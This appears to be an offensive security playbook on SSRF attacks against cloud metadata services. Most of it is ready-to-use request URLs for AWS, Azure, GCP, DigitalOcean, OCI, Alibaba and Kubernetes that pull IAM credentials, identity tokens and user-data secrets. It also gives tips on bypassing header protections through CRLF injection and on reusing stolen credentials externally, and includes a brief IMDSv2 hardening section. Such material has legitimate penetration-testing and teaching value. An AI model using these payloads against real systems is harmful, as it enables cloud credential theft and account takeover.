# SSRF — Cloud Metadata Exploitation

## When this applies

- SSRF target is hosted on AWS, Azure, GCP, DigitalOcean, OCI, or Alibaba Cloud.
- Application can fetch arbitrary URLs.
- Goal: read instance metadata (IAM credentials, service-account tokens, user-data secrets).

## Technique

Hit the cloud-specific metadata endpoint (`169.254.169.254` for most clouds, `metadata.google.internal` for GCP, `100.100.100.200` for Alibaba). Extract IAM/role credentials, then assume those credentials externally.

## Steps

### AWS EC2 metadata — IMDSv1

```bash
# Base endpoint
http://169.254.169.254/latest/meta-data/

# Instance information
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4

# IAM role credentials (CRITICAL)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]/

# User data (may contain secrets)
http://169.254.169.254/latest/user-data

# Instance identity document
http://169.254.169.254/latest/dynamic/instance-identity/document

# Public keys
http://169.254.169.254/latest/meta-data/public-keys/
```

### AWS EC2 metadata — IMDSv2 (SSRF-Resistant)

```bash
# Requires session token via PUT request
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

**SSRF Note**: Most SSRF vulnerabilities can't perform PUT requests or set custom headers, making IMDSv2 resistant.

### Azure instance metadata

```bash
# Base endpoint (requires header)
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true

# Instance information
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01

# Managed identity token (CRITICAL)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Scheduled events
http://169.254.169.254/metadata/scheduledevents?api-version=2019-08-01
```

**SSRF Note**: Requires `Metadata: true` header, but some SSRF contexts allow header injection.

### Google Cloud metadata

```bash
# Base endpoint (requires header)
http://metadata.google.internal/computeMetadata/v1/
Header: Metadata-Flavor: Google

# Alternative IP
http://169.254.169.254/computeMetadata/v1/
Header: Metadata-Flavor: Google

# Project information
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id

# Instance information
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id

# Service account token (CRITICAL)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# All attributes (recursive)
http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true
http://metadata.google.internal/computeMetadata/v1/project/?recursive=true

# Kube-env (GKE sensitive data)
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
```

**SSRF Note**: Requires `Metadata-Flavor: Google` header.

### DigitalOcean metadata

```bash
# Instance metadata
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region

# User data
http://169.254.169.254/metadata/v1/user-data

# Interfaces
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address
```

### Oracle Cloud Infrastructure (OCI)

```bash
# Instance metadata
http://169.254.169.254/opc/v2/instance/
http://169.254.169.254/opc/v1/instance/

# VNIC information
http://169.254.169.254/opc/v2/vnics/
```

### Alibaba Cloud

```bash
# Instance metadata
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id

# RAM role credentials
http://100.100.100.200/latest/meta-data/ram/security-credentials/[ROLE_NAME]
```

### Kubernetes

```bash
# Service account token
/var/run/secrets/kubernetes.io/serviceaccount/token

# Via SSRF (if file:// allowed)
file:///var/run/secrets/kubernetes.io/serviceaccount/token

# API server
https://kubernetes.default.svc/api/v1/namespaces/default/pods
```

### IMDSv2 hardening (defender's view)

```bash
# Enable IMDSv2 on EC2 instance
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \
  --http-put-response-hop-limit 1
```

## Verifying success

- AWS: `iam/security-credentials/<role>/` returns JSON with `AccessKeyId`, `SecretAccessKey`, `Token`.
- GCP: token endpoint returns `{"access_token": "...", "token_type": "Bearer"}`.
- Credentials authenticate against cloud APIs (sts get-caller-identity, gcloud auth list).

## Common pitfalls

- IMDSv2-only environments require setting custom headers — most SSRF can't. Try header-injection via CRLF if available.
- GCP requires `Metadata-Flavor: Google` — without it, the service refuses to respond.
- Some cloud envs run behind a metadata proxy (kiam, kube2iam) — endpoint paths differ.

## Tools

- Burp Suite Repeater
- AWS CLI (`aws sts get-caller-identity`)
- gcloud CLI
- pacu (AWS post-exploitation)
- ScoutSuite (cloud audit)
